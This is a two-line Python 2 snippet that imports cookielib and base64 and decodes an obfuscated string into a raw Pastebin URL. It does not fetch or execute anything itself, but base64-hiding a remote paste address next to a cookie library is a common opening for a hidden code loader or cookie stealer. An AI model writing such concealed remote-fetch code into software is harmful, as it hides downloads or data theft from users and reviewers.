import cookielib,base64

a=base64.b64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1N4TktMNUd3")